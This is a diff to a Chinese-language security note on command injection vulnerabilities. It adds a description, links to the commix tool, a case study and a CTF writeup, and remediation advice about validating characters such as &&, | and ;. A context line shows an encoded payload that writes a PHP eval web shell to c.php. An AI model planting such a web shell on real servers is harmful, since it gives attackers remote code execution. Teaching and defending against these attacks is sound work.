@@ -8,8 +8,15 @@
 
 ---
 
+**描述**
+
+由于业务需求，程序有可能要执行系统命令的功能，但如果执行的命令用户可控，业务上有没有做好限制，就可能出现命令执行漏洞。
+
 **相关工具**
 - [commixproject/commix](https://github.com/commixproject/commix)
+
+**相关案例**
+- [静态站点托管平台仅能托管静态资源？](https://tttang.com/archive/1501/)
 
 **writeup**
 - [BUUCTF--[第二章 web进阶]死亡ping命令](https://blog.csdn.net/qq_45414878/article/details/109672659)
@@ -139,3 +146,10 @@ sh ls
 ls -t
 echo PD9waHAgZXZhbCgkX0dFVFsxXSk7 | base64 -d>c.php
 ```
+
+---
+
+## 修复方案
+
+* 避免命令用户可控
+* 如需用户输入参数，则对用户输入做严格校验，如&&、|、;等
